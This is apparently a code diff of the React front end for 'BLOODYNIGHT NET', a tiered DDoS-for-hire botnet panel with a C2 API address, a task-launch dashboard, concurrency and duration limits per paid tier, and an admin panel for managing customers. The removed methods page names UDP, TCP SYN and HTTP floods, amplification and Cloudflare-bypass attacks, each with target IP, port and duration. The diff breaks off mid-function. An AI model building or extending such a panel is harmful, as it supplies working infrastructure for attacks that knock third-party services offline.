@@ -1,36 +1,31 @@
-/*
-  This file contains the bundled JavaScript for the entire React application.
-  It includes all components, state management, and API logic.
-  It simulates the output of 'npm run build' from a React project.
-*/
-
-// Polyfills for older browsers if needed (React typically adds these)
-// Example:
-// if (typeof Object.assign !== 'function') {
-//   Object.assign = function (target) { /* ... */ };
-// }
+// CDN Imports for React and ReactDOM
+// These are assumed to be available globally if you're not using a bundler.
+// Ensure these are included in your index.html:
+// <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+// <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
 
 // --- BEGIN: External Library - jwt-decode (Simplified for bundling) ---
 // This is a minimal representation of jwt-decode's core functionality.
 // In a real build, the full library would be included.
 function jwtDecode(token) {
-  try {
-    const base64Url = token.split('.')[1];
-    const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
-    const jsonPayload = decodeURIComponent(atob(base64).split('').map(function(c) {
-      return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
-    }).join(''));
-    return JSON.parse(jsonPayload);
-  } catch (e) {
-    console.error("Error decoding JWT:", e);
-    return {};
-  }
+    try {
+        const base64Url = token.split('.')[1];
+        const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
+        const jsonPayload = decodeURIComponent(atob(base64).split('').map(function(c) {
+            return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+        }).join(''));
+        return JSON.parse(jsonPayload);
+    } catch (e) {
+        console.error("Error decoding JWT:", e);
+        return {};
+    }
 }
 // --- END: External Library - jwt-decode ---
 
 
 // --- BEGIN: src/api.js ---
-const C2_API_BASE_URL = "http://YOUR_PLAYIT_WEB_API_URL_OR_IP:PORT"; // <<< IMPORTANT: CHANGE THIS!
+// IMPORTANT: CHANGE THIS URL to your actual Playit.gg web API URL or IP:PORT
+const C2_API_BASE_URL = "http://YOUR_PLAYIT_WEB_API_URL_OR_IP:PORT";
 
 const api = {
     signup: async (username, password) => {
@@ -196,7 +191,7 @@ const useAuth = () => React.useContext(AuthContext);
 
 // --- BEGIN: src/components/BackgroundDots.js ---
 const BackgroundDots = () => {
-  return React.createElement('div', { className: 'background-dots' });
+    return React.createElement('div', { className: 'background-dots' });
 };
 // --- END: src/components/BackgroundDots.js ---
 
@@ -545,8 +540,8 @@ const Dashboard = () => {
                 ),
                 userAllowedCommands.length === 0 && user.tier !== 'Noob' && (
                      React.createElement('div', { className: 'status-message status-error mb-4' },
-                        'ERROR: Your current package has no allowed task methods.'
-                    )
+                         'ERROR: Your current package has no allowed task methods.'
+                     )
                 ),
 
                 React.createElement('div', { className: 'space-y-4', style: { opacity: (canLaunchTasks && userAllowedCommands.length > 0 && user.tier !== 'Noob') ? 1 : 0.5, pointerEvents: (canLaunchTasks && userAllowedCommands.length > 0 && user.tier !== 'Noob') ? 'auto' : 'none' } },
@@ -643,20 +638,40 @@ const Dashboard = () => {
 const AdminPanel = () => {
     const { token, user, logout } = React.useAuth();
     const [users, setUsers] = React.useState([]);
-    const [message, setMessage] = React.useState('');
-    const [messageType, setMessageType] = React.useState(''); // 'success' or 'error'
+    const [adminMessage, setAdminMessage] = React.useState('');
+    const [adminMessageType, setAdminMessageType] = React.useState(''); // 'success', 'error', 'info'
+
+    const [showCreateForm, setShowCreateForm] = React.useState(false);
+    const [newUsername, setNewUsername] = React.useState('');
+    const [newPassword, setNewPassword] = React.useState('');
+    const [newTier, setNewTier] = React.useState('Noob');
+    const [newConcurrent, setNewConcurrent] = React.useState(0);
+    const [newDuration, setNewDuration] = React.useState(0);
+    const [newIsLifetimeVIP, setNewIsLifetimeVIP] = React.useState(false);
+    const [newIsAdmin, setNewIsAdmin] = React.useState(false);
+
+    const [editingUser, setEditingUser] = React.useState(null); // User object being edited
 
     const fetchUsers = async () => {
         if (!token || !user || !user.isAdmin) return;
+        setAdminMessage('Fetching users...');
+        setAdminMessageType('info');
         try {
             const data = await api.adminGetUsers(token);
-            setUsers(data);
+            if (data.users) {
+                setUsers(data.users);
+                setAdminMessage('Users loaded successfully.');
+                setAdminMessageType('success');
+            } else {
+                setAdminMessage(data.message || 'Failed to fetch users.');
+                setAdminMessageType('error');
+            }
         } catch (error) {
             console.error('Error fetching users:', error);
-            setMessage('Error fetching users. Check console.');
-            setMessageType('error');
-            if (error.message.includes('401') || error.message.includes('403')) {
-                logout(); // Log out if unauthorized
+            setAdminMessage(`Network error: ${error.message}`);
+            setAdminMessageType('error');
+            if (error.message.includes('401') || error.message.includes('Unauthorized')) {
+                logout();
             }
         }
     };
@@ -667,50 +682,98 @@ const AdminPanel = () => {
         return () => clearInterval(interval);
     }, [token, user]);
 
-    const handleUpdateUser = async (updatedUser) => {
-        setMessage('');
-        setMessageType('');
+    const handleCreateUser = async (e) => {
+        e.preventDefault();
+        setAdminMessage('Creating user...');
+        setAdminMessageType('info');
         try {
-            const data = await api.adminUpdateUser(token, updatedUser);
-            if (data.message) {
-                setMessage(data.message);
-                setMessageType('success');
-                fetchUsers(); // Refresh list
+            // First, sign up the user (creates basic account)
+            const signupResult = await api.signup(newUsername, newPassword);
+            if (signupResult.error) {
+                setAdminMessage(`Signup failed: ${signupResult.error}`);
+                setAdminMessageType('error');
+                return;
+            }
+
+            // Then, update their profile with tier/concurrent/duration/admin status
+            const updateResult = await api.adminUpdateUser(token, {
+                username: newUsername,
+                tier: newTier,
+                concurrent: newConcurrent,
+                duration: newDuration,
+                isLifetimeVIP: newIsLifetimeVIP,
+                isAdmin: newIsAdmin
+            });
+
+            if (updateResult.status === 'success') {
+                setAdminMessage(`User "${newUsername}" created and updated successfully!`);
+                setAdminMessageType('success');
+                setNewUsername('');
+                setNewPassword('');
+                setNewTier('Noob');
+                setNewConcurrent(0);
+                setNewDuration(0);
+                setNewIsLifetimeVIP(false);
+                setNewIsAdmin(false);
+                setShowCreateForm(false);
+                fetchUsers(); // Refresh user list
             } else {
-                setMessage(data.error || 'Failed to update user.');
-                setMessageType('error');
+                setAdminMessage(`Failed to update user details after signup: ${updateResult.message || 'Unknown error'}`);
+                setAdminMessageType('error');
+            }
+        } catch (error) {
+            console.error('Error creating user:', error);
+            setAdminMessage(`Network error during user creation: ${error.message}`);
+            setAdminMessageType('error');
+        }
+    };
+
+    const handleUpdateUser = async (userData) => {
+        setAdminMessage(`Updating user "${userData.username}"...`);
+        setAdminMessageType('info');
+        try {
+            const result = await api.adminUpdateUser(token, userData);
+            if (result.status === 'success') {
+                setAdminMessage(`User "${userData.username}" updated successfully!`);
+                setAdminMessageType('success');
+                setEditingUser(null); // Exit edit mode
+                fetchUsers(); // Refresh user list
+            } else {
+                setAdminMessage(`Failed to update user "${userData.username}": ${result.message || 'Unknown error'}`);
+                setAdminMessageType('error');
             }
         } catch (error) {
             console.error('Error updating user:', error);
-            setMessage(`NETWORK ERROR: ${error.message}`);
-            setMessageType('error');
+            setAdminMessage(`Network error during user update: ${error.message}`);
+            setAdminMessageType('error');
         }
     };
 
     const handleDeleteUser = async (usernameToDelete) => {
-        setMessage('');
-        setMessageType('');
-        if (window.confirm(`Are you sure you want to delete user ${usernameToDelete}?`)) {
-            try {
-                const data = await api.adminDeleteUser(token, usernameToDelete);
-                if (data.message) {
-                    setMessage(data.message);
-                    setMessageType('success');
-                    fetchUsers(); // Refresh list
-                } else {
-                    setMessage(data.error || 'Failed to delete user.');
-                    setMessageType('error');
-                }
-            } catch (error) {
-                console.error('Error deleting user:', error);
-                setMessage(`NETWORK ERROR: ${error.message}`);
-                setMessageType('error');
+        if (!confirm(`Are you sure you want to delete user "${usernameToDelete}"? This action cannot be undone.`)) {
+            return;
+        }
+        setAdminMessage(`Deleting user "${usernameToDelete}"...`);
+        setAdminMessageType('info');
+        try {
+            const result = await api.adminDeleteUser(token, usernameToDelete);
+            if (result.status === 'success') {
+                setAdminMessage(`User "${usernameToDelete}" deleted successfully.`);
+                setAdminMessageType('success');
+                fetchUsers(); // Refresh user list
+            } else {
+                setAdminMessage(`Failed to delete user "${usernameToDelete}": ${result.message || 'Unknown error'}`);
+                setAdminMessageType('error');
             }
+        } catch (error) {
+            console.error('Error deleting user:', error);
+            setAdminMessage(`Network error during user deletion: ${error.message}`);
+            setAdminMessageType('error');
         }
     };
 
     if (!user || !user.isAdmin) {
-        return React.createElement('div', { className: 'text-center text-red-400 mt-10' }, 'ACCESS DENIED: ADMIN PRIVILEGES REQUIRED.');
+        return React.createElement('div', { className: 'text-center text-gray-400 mt-10' }, 'ACCESS DENIED: ADMIN PRIVILEGES REQUIRED.');
     }
 
     return (
@@ -720,91 +783,201 @@ const AdminPanel = () => {
                 React.createElement('button', { onClick: logout, className: 'btn-logout' }, 'LOGOUT')
             ),
 
-            message && (
-                React.createElement('div', { className: `status-message ${messageType === 'success' ? 'status-success' : 'status-error'} mb-4 text-center` },
-                    message
+            adminMessage && (
+                React.createElement('div', { className: `status-message ${adminMessageType === 'success' ? 'status-success' : adminMessageType === 'error' ? 'status-error' : 'status-info'} mb-4` },
+                    adminMessage
                 )
             ),
 
-            React.createElement('div', { className: 'card p-6' },
-                React.createElement('h2', { className: 'text-2xl font-semibold mb-4 text-purple-300' }, 'MANAGE USERS'),
-                React.createElement('div', { className: 'overflow-x-auto' },
-                    React.createElement('table', { className: 'min-w-full divide-y divide-gray-700' },
-                        React.createElement('thead', { className: 'bg-gray-700' },
-                            React.createElement('tr', null,
-                                React.createElement('th', { scope: 'col', className: 'px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider' }, 'USERNAME'),
-                                React.createElement('th', { scope: 'col', className: 'px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider' }, 'TIER'),
-                                React.createElement('th', { scope: 'col', className: 'px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider' }, 'CONCURRENT'),
-                                React.createElement('th', { scope: 'col', className: 'px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider' }, 'DURATION'),
-                                React.createElement('th', { scope: 'col', className: 'px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider' }, 'LIFETIME VIP'),
-                                React.createElement('th', { scope: 'col', className: 'px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider' }, 'ADMIN'),
-                                React.createElement('th', { scope: 'col', className: 'px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider' }, 'ACTIONS')
+            // Create New User Section
+            React.createElement('div', { className: 'card p-6 mb-8' },
+                React.createElement('h2', { className: 'text-2xl font-semibold mb-4 text-purple-300' }, 'CREATE NEW USER'),
+                React.createElement('button', {
+                    onClick: () => setShowCreateForm(!showCreateForm),
+                    className: 'btn-primary mb-4'
+                }, showCreateForm ? 'HIDE FORM' : 'SHOW FORM'),
+
+                showCreateForm && (
+                    React.createElement('form', { onSubmit: handleCreateUser, className: 'space-y-4 mt-4' },
+                        React.createElement('div', null,
+                            React.createElement('label', { className: 'block text-sm font-medium text-gray-300 mb-1' }, 'USERNAME:'),
+                            React.createElement('input', {
+                                type: 'text',
+                                className: 'input-field w-full',
+                                value: newUsername,
+                                onChange: (e) => setNewUsername(e.target.value),
+                                required: true
+                            })
+                        ),
+                        React.createElement('div', null,
+                            React.createElement('label', { className: 'block text-sm font-medium text-gray-300 mb-1' }, 'PASSWORD:'),
+                            React.createElement('input', {
+                                type: 'password',
+                                className: 'input-field w-full',
+                                value: newPassword,
+                                onChange: (e) => setNewPassword(e.target.value),
+                                required: true
+                            })
+                        ),
+                        React.createElement('div', null,
+                            React.createElement('label', { className: 'block text-sm font-medium text-gray-300 mb-1' }, 'TIER:'),
+                            React.createElement('select', {
+                                className: 'input-field w-full',
+                                value: newTier,
+                                onChange: (e) => setNewTier(e.target.value)
+                            },
+                                React.createElement('option', { value: 'Noob' }, 'Noob'),
+                                React.createElement('option', { value: 'Normal' }, 'Normal'),
+                                React.createElement('option', { value: 'VIP' }, 'VIP')
                             )
                         ),
-                        React.createElement('tbody', { className: 'bg-gray-800 divide-y divide-gray-700' },
-                            users.map((userItem) => (
-                                React.createElement('tr', { key: userItem.username },
-                                    React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-100' }, userItem.username),
-                                    React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap text-sm text-gray-200' },
-                                        React.createElement('select', {
-                                            className: 'input-field bg-gray-700 text-gray-200',
-                                            value: userItem.tier,
-                                            onChange: (e) => handleUpdateUser({ ...userItem, tier: e.target.value }),
-                                            disabled: userItem.username === 'admin'
-                                        },
-                                            React.createElement('option', { value: 'Noob' }, 'Noob'),
-                                            React.createElement('option', { value: 'Normal' }, 'Normal'),
-                                            React.createElement('option', { value: 'VIP' }, 'VIP')
+                        React.createElement('div', null,
+                            React.createElement('label', { className: 'block text-sm font-medium text-gray-300 mb-1' }, 'MAX CONCURRENT TASKS:'),
+                            React.createElement('input', {
+                                type: 'number',
+                                className: 'input-field w-full',
+                                value: newConcurrent,
+                                onChange: (e) => setNewConcurrent(parseInt(e.target.value) || 0),
+                                min: 0
+                            })
+                        ),
+                        React.createElement('div', null,
+                            React.createElement('label', { className: 'block text-sm font-medium text-gray-300 mb-1' }, 'MAX DURATION (SECONDS):'),
+                            React.createElement('input', {
+                                type: 'number',
+                                className: 'input-field w-full',
+                                value: newDuration,
+                                onChange: (e) => setNewDuration(parseInt(e.target.value) || 0),
+                                min: 0
+                            })
+                        ),
+                        React.createElement('div', { className: 'flex items-center space-x-2' },
+                            React.createElement('input', {
+                                type: 'checkbox',
+                                id: 'newIsLifetimeVIP',
+                                className: 'form-checkbox',
+                                checked: newIsLifetimeVIP,
+                                onChange: (e) => setNewIsLifetimeVIP(e.target.checked)
+                            }),
+                            React.createElement('label', { htmlFor: 'newIsLifetimeVIP', className: 'text-sm font-medium text-gray-300' }, 'LIFETIME VIP')
+                        ),
+                        React.createElement('div', { className: 'flex items-center space-x-2' },
+                            React.createElement('input', {
+                                type: 'checkbox',
+                                id: 'newIsAdmin',
+                                className: 'form-checkbox',
+                                checked: newIsAdmin,
+                                onChange: (e) => setNewIsAdmin(e.target.checked)
+                            }),
+                            React.createElement('label', { htmlFor: 'newIsAdmin', className: 'text-sm font-medium text-gray-300' }, 'ADMIN USER')
+                        ),
+                        React.createElement('button', { type: 'submit', className: 'btn-primary w-full' }, 'CREATE USER')
+                    )
+                )
+            ),
+
+            // User List Section
+            React.createElement('div', { className: 'card p-6' },
+                React.createElement('h2', { className: 'text-2xl font-semibold mb-4 text-purple-300' }, 'MANAGE USERS'),
+                users.length === 0 ? (
+                    React.createElement('p', { className: 'text-gray-400' }, 'No users found.')
+                ) : (
+                    React.createElement('div', { className: 'overflow-x-auto' },
+                        React.createElement('table', { className: 'min-w-full divide-y divide-gray-700' },
+                            React.createElement('thead', null,
+                                React.createElement('tr', null,
+                                    React.createElement('th', { className: 'px-6 py-3 text-left text-xs font-medium text-gray-200 uppercase tracking-wider' }, 'USERNAME'),
+                                    React.createElement('th', { className: 'px-6 py-3 text-left text-xs font-medium text-gray-200 uppercase tracking-wider' }, 'TIER'),
+                                    React.createElement('th', { className: 'px-6 py-3 text-left text-xs font-medium text-gray-200 uppercase tracking-wider' }, 'CONCURRENT'),
+                                    React.createElement('th', { className: 'px-6 py-3 text-left text-xs font-medium text-gray-200 uppercase tracking-wider' }, 'DURATION'),
+                                    React.createElement('th', { className: 'px-6 py-3 text-left text-xs font-medium text-gray-200 uppercase tracking-wider' }, 'VIP'),
+                                    React.createElement('th', { className: 'px-6 py-3 text-left text-xs font-medium text-gray-200 uppercase tracking-wider' }, 'ADMIN'),
+                                    React.createElement('th', { className: 'px-6 py-3 text-left text-xs font-medium text-gray-200 uppercase tracking-wider' }, 'ACTIONS')
+                                )
+                            ),
+                            React.createElement('tbody', { className: 'bg-gray-800 divide-y divide-gray-700' },
+                                users.map(userItem => (
+                                    editingUser && editingUser.username === userItem.username ? (
+                                        // Edit row
+                                        React.createElement('tr', { key: userItem.username },
+                                            React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap' }, editingUser.username),
+                                            React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap' },
+                                                React.createElement('select', {
+                                                    className: 'input-field w-20',
+                                                    value: editingUser.tier,
+                                                    onChange: (e) => setEditingUser({ ...editingUser, tier: e.target.value })
+                                                },
+                                                    React.createElement('option', { value: 'Noob' }, 'Noob'),
+                                                    React.createElement('option', { value: 'Normal' }, 'Normal'),
+                                                    React.createElement('option', { value: 'VIP' }, 'VIP')
+                                                )
+                                            ),
+                                            React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap' },
+                                                React.createElement('input', {
+                                                    type: 'number',
+                                                    className: 'input-field w-20',
+                                                    value: editingUser.concurrent,
+                                                    onChange: (e) => setEditingUser({ ...editingUser, concurrent: parseInt(e.target.value) || 0 })
+                                                })
+                                            ),
+                                            React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap' },
+                                                React.createElement('input', {
+                                                    type: 'number',
+                                                    className: 'input-field w-20',
+                                                    value: editingUser.duration,
+                                                    onChange: (e) => setEditingUser({ ...editingUser, duration: parseInt(e.target.value) || 0 })
+                                                })
+                                            ),
+                                            React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap' },
+                                                React.createElement('input', {
+                                                    type: 'checkbox',
+                                                    className: 'form-checkbox',
+                                                    checked: editingUser.isLifetimeVIP,
+                                                    onChange: (e) => setEditingUser({ ...editingUser, isLifetimeVIP: e.target.checked })
+                                                })
+                                            ),
+                                            React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap' },
+                                                React.createElement('input', {
+                                                    type: 'checkbox',
+                                                    className: 'form-checkbox',
+                                                    checked: editingUser.isAdmin,
+                                                    onChange: (e) => setEditingUser({ ...editingUser, isAdmin: e.target.checked })
+                                                })
+                                            ),
+                                            React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap text-right text-sm font-medium space-x-2' },
+                                                React.createElement('button', {
+                                                    onClick: () => handleUpdateUser(editingUser),
+                                                    className: 'btn-primary px-3 py-1 text-xs'
+                                                }, 'SAVE'),
+                                                React.createElement('button', {
+                                                    onClick: () => setEditingUser(null),
+                                                    className: 'btn-logout px-3 py-1 text-xs'
+                                                }, 'CANCEL')
+                                            )
                                         )
-                                    ),
-                                    React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap text-sm text-gray-200' },
-                                        React.createElement('input', {
-                                            type: 'number',
-                                            className: 'input-field bg-gray-700 text-gray-200 w-20',
-                                            value: userItem.concurrent,
-                                            onChange: (e) => handleUpdateUser({ ...userItem, concurrent: parseInt(e.target.value) || 0 }),
-                                            disabled: userItem.username === 'admin'
-                                        })
-                                    ),
-                                    React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap text-sm text-gray-200' },
-                                        React.createElement('input', {
-                                            type: 'number',
-                                            className: 'input-field bg-gray-700 text-gray-200 w-20',
-                                            value: userItem.duration,
-                                            onChange: (e) => handleUpdateUser({ ...userItem, duration: parseInt(e.target.value) || 0 }),
-                                            disabled: userItem.username === 'admin'
-                                        })
-                                    ),
-                                    React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap text-sm text-gray-200' },
-                                        React.createElement('input', {
-                                            type: 'checkbox',
-                                            className: 'form-checkbox h-5 w-5 text-red-600 rounded', // Checkbox color changed
-                                            checked: userItem.isLifetimeVIP,
-                                            onChange: (e) => handleUpdateUser({ ...userItem, isLifetimeVIP: e.target.checked }),
-                                            disabled: userItem.username === 'admin'
-                                        })
-                                    ),
-                                    React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap text-sm text-gray-200' },
-                                        React.createElement('input', {
-                                            type: 'checkbox',
-                                            className: 'form-checkbox h-5 w-5 text-red-600 rounded', // Checkbox color changed
-                                            checked: userItem.isAdmin,
-                                            onChange: (e) => handleUpdateUser({ ...userItem, isAdmin: e.target.checked }),
-                                            disabled: userItem.username === 'admin'
-                                        })
-                                    ),
-                                    React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap text-right text-sm font-medium' },
-                                        userItem.username !== 'admin' && (
-                                            React.createElement('button', {
-                                                onClick: () => handleDeleteUser(userItem.username),
-                                                className: 'btn-primary bg-red-600 hover:bg-red-700 text-white px-3 py-1 text-xs'
-                                            },
-                                                'DELETE'
+                                    ) : (
+                                        // Display row
+                                        React.createElement('tr', { key: userItem.username },
+                                            React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap' }, userItem.username),
+                                            React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap' }, userItem.tier),
+                                            React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap' }, userItem.concurrent),
+                                            React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap' }, userItem.duration),
+                                            React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap' }, userItem.isLifetimeVIP ? 'Yes' : 'No'),
+                                            React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap' }, userItem.isAdmin ? 'Yes' : 'No'),
+                                            React.createElement('td', { className: 'px-6 py-4 whitespace-nowrap text-right text-sm font-medium space-x-2' },
+                                                React.createElement('button', {
+                                                    onClick: () => setEditingUser({ ...userItem }), // Create a copy for editing
+                                                    className: 'btn-primary px-3 py-1 text-xs'
+                                                }, 'EDIT'),
+                                                React.createElement('button', {
+                                                    onClick: () => handleDeleteUser(userItem.username),
+                                                    className: 'btn-logout px-3 py-1 text-xs'
+                                                }, 'DELETE')
                                             )
                                         )
                                     )
-                                )
-                            ))
+                                ))
+                            )
                         )
                     )
                 )
@@ -815,239 +988,92 @@ const AdminPanel = () => {
 // --- END: src/AdminPanel.js ---
 
 
-// --- BEGIN: src/MethodsHelp.js (New Component) ---
-const MethodsHelp = () => {
-    const methods = [
-        {
-            name: '!udp',
-            params: '(IP Port Duration)',
-            description: 'Launches a User Datagram Protocol (UDP) flood. Sends a large volume of UDP packets to the target IP and port, aiming to saturate bandwidth or overwhelm server resources.',
-            tier: 'Normal'
-        },
-        {
-            name: '!tcp',
-            params: '(IP Port Duration)',
-            description: 'Initiates a Transmission Control Protocol (TCP) SYN flood. Rapidly attempts to open connections to the target IP and port, aiming to exhaust server connection tables.',
-            tier: 'Normal'
-        },
-        {
-            name: '!http',
-            params: '(URL Duration)',
-            description: 'Performs a Hypertext Transfer Protocol (HTTP) GET flood. Sends numerous HTTP GET requests to the specified URL, aiming to overwhelm web servers or applications.',
-            tier: 'Normal'
-        },
-        {
-            name: '!stdhex',
-            params: '(IP Port Duration)',
-            description: 'Placeholder for a custom standard hexadecimal flood. (Advanced method, full implementation not provided in C bot).',
-            tier: 'VIP'
-        },
-        {
-            name: '!vse',
-            params: '(IP Port Duration)',
-            description: 'Placeholder for a Valve Source Engine (VSE) query flood. (Advanced method, full implementation not provided in C bot).',
-            tier: 'VIP'
-        },
-        {
-            name: '!pps',
-            params: '(IP Port Duration)',
-            description: 'Placeholder for a Packets Per Second (PPS) flood. Aims to generate a high rate of packets. (Advanced method, full implementation not provided in C bot).',
-            tier: 'VIP'
-        },
-        {
-            name: '!emptyip',
-            params: '(IP Duration)',
-            description: 'Placeholder for an Empty IP flood. (Advanced method, full implementation not provided in C bot).',
-            tier: 'VIP'
-        },
-        {
-            name: '!lol',
-            params: '(IP Port Duration)',
-            description: 'Placeholder for a custom "LOL" flood method. (Advanced method, full implementation not provided in C bot).',
-            tier: 'VIP'
-        },
-        {
-            name: '!sybex',
-            params: '(IP Port Duration)',
-            description: 'Placeholder for a Sybex-specific flood method. (Advanced method, full implementation not provided in C bot).',
-            tier: 'VIP'
-        },
-        {
-            name: '!nfo_tcp',
-            params: '(IP Port Duration)',
-            description: 'Placeholder for an NFO-specific TCP flood. (Advanced method, full implementation not provided in C bot).',
-            tier: 'VIP'
-        },
-        {
-            name: '!udp_bypass',
-            params: '(IP Duration)',
-            description: 'Placeholder for a UDP bypass method, potentially designed to evade certain filtering. (Advanced method, full implementation not provided in C bot).',
-            tier: 'VIP'
-        },
-        {
-            name: '!ovhack_psh_ack',
-            params: '(IP Port Duration)',
-            description: 'Placeholder for an OVHACK PSH ACK flood. (Advanced method, full implementation not provided in C bot).',
-            tier: 'VIP'
-        },
-        {
-            name: '!tcp_amp',
-            params: '(IP Port Duration)',
-            description: 'Placeholder for a TCP amplification flood. (Advanced method, full implementation not provided in C bot).',
-            tier: 'VIP'
-        },
-        {
-            name: '!custom',
-            params: '(IP Port Duration)',
-            description: 'Placeholder for a generic custom flood method. (Advanced method, full implementation not provided in C bot).',
-            tier: 'VIP'
-        },
-        {
-            name: '!jsbypass',
-            params: '(URL Duration)',
-            description: 'Placeholder for a JavaScript challenge bypass. Typically involves simulating browser behavior to solve JS challenges. (Highly advanced, full implementation not provided in C bot).',
-            tier: 'VIP'
-        },
-        {
-            name: '!uambypass',
-            params: '(URL Duration)',
-            description: 'Placeholder for a Cloudflare Under Attack Mode (UAM) bypass. Involves solving client-side challenges. (Highly advanced, full implementation not provided in C bot).',
-            tier: 'VIP'
-        },
-        {
-            name: '!cloudflare',
-            params: '(URL Duration)',
-            description: 'Placeholder for a general Cloudflare protection bypass. (Highly advanced, full implementation not provided in C bot).',
-            tier: 'VIP'
-        },
-        {
-            name: '!fart',
-            params: '(URL Duration)',
-            description: 'Placeholder for a "Fart" method, likely a custom HTTP flood variant. (Advanced method, full implementation not provided in C bot).',
-            tier: 'VIP'
-        },
-        {
-            name: '!httprawadv',
-            params: '(URL Duration)',
-            description: 'Placeholder for an advanced raw HTTP flood method, allowing highly customized requests. (Advanced method, full implementation not provided in C bot).',
-            tier: 'VIP'
-        }
-    ];
-
-    return (
-        React.createElement('div', { className: 'max-w-4xl mx-auto p-4 sm:p-8' },
-            React.createElement('h1', { className: 'text-3xl sm:text-4xl font-bold text-red-400 mb-8' }, 'AVAILABLE TASK METHODS'),
-            React.createElement('div', { className: 'space-y-6' },
-                methods.map((method, index) => (
-                    React.createElement('div', { key: index, className: 'card p-6' },
-                        React.createElement('h2', { className: 'text-xl font-semibold text-red-300 mb-2' },
-                            React.createElement('span', { className: 'font-bold' }, method.name), ' ',
-                            React.createElement('span', { className: 'text-gray-400 text-sm' }, method.params)
-                        ),
-                        React.createElement('p', { className: 'text-gray-300 mb-2' }, method.description),
-                        React.createElement('div', { className: 'flex items-center text-sm' },
-                            React.createElement('span', { className: 'font-semibold text-gray-400 mr-2' }, 'Available for Tier:'),
-                            React.createElement('span', { className: `px-2 py-1 rounded-full text-xs font-semibold ${
-                                method.tier === 'Noob' ? 'bg-gray-600 text-gray-200' :
-                                method.tier === 'Normal' ? 'bg-purple-700 text-purple-100' :
-                                'bg-red-700 text-red-100'
-                            }` }, method.tier.toUpperCase())
-                        )
-                    )
-                ))
-            )
-        )
-    );
-};
-// --- END: src/MethodsHelp.js ---
-
-
-// --- BEGIN: src/App.js (Main React App component with routing) ---
-const AppContent = () => {
-  const { user, loading, logout } = React.useAuth(); // Destructure logout from useAuth
-  const [currentPage, setCurrentPage] = React.useState('auth'); // 'auth', 'dashboard', 'admin', 'methods'
-
-  React.useEffect(() => {
-    if (!loading) {
-      if (user) {
-        if (user.isAdmin) {
-          setCurrentPage('admin');
-        } else {
-          setCurrentPage('dashboard');
-        }
-      } else {
-        setCurrentPage('auth');
-      }
-    }
-  }, [user, loading]);
-
-  if (loading) {
-    return (
-      React.createElement('div', { className: 'min-h-screen flex items-center justify-center bg-gray-900 text-white' },
-        'LOADING...'
-      )
-    );
-  }
-
-  const renderPage = () => {
-    if (currentPage === 'auth') {
-      return React.createElement(Auth, { onAuthSuccess: () => setCurrentPage(user.isAdmin ? 'admin' : 'dashboard') });
-    } else if (currentPage === 'dashboard') {
-      return React.createElement(Dashboard, null);
-    } else if (currentPage === 'admin') {
-      return React.createElement(AdminPanel, null);
-    } else if (currentPage === 'methods') { // New page route
-      return React.createElement(MethodsHelp, null);
-    }
-    return null;
-  };
-
-  return (
-    React.createElement('div', { className: 'relative min-h-screen' },
-      React.createElement(BackgroundDots, null), // Animated background
-      React.createElement('header', { className: 'header-bar' },
-        React.createElement('div', { className: 'site-title' }, 'BLOODYNIGHT NET'),
-        user && (
-          React.createElement('nav', { className: 'space-x-4' },
-            !user.isAdmin && React.createElement('button', {
-                className: `nav-link ${currentPage === 'dashboard' ? 'active' : ''}`,
-                onClick: () => setCurrentPage('dashboard')
-            }, 'DASHBOARD'),
-            user.isAdmin && React.createElement('button', {
-                className: `nav-link ${currentPage === 'admin' ? 'active' : ''}`,
-                onClick: () => setCurrentPage('admin')
-            }, 'ADMIN PANEL'),
-            React.createElement('button', { // New Methods link
-                className: `nav-link ${currentPage === 'methods' ? 'active' : ''}`,
-                onClick: () => setCurrentPage('methods')
-            }, 'METHODS'),
-            React.createElement('button', {
-                className: 'btn-logout',
-                onClick: () => {
-                    logout();
-                    setCurrentPage('auth'); // Redirect to auth page on logout
-                }
-            }, 'LOGOUT')
-          )
-        )
-      ),
-      React.createElement('main', { className: 'py-8' }, // Add padding to main content
-        renderPage()
-      )
-    )
-  );
-};
-
+// --- BEGIN: src/App.js (Main Application Component) ---
 const App = () => {
-  return (
-    React.createElement(AuthProvider, null,
-      React.createElement(AppContent, null)
-    )
-  );
-};
+    const { user, loading, logout } = useAuth();
+    const [currentPage, setCurrentPage] = React.useState('dashboard'); // 'dashboard' or 'admin'
 
+    // Redirect to dashboard/admin based on user role after login
+    React.useEffect(() => {
+        if (!loading && user) {
+            if (user.isAdmin) {
+                setCurrentPage('admin');
+            } else {
+                setCurrentPage('dashboard');
+            }
+        } else if (!loading && !user) {
+            // If not logged in, ensure we are not on dashboard/admin page
+            setCurrentPage('auth');
+        }
+    }, [user, loading]);
+
+    const handleAuthSuccess = () => {
+        // After successful login/signup, AuthContext's useEffect will update `user`
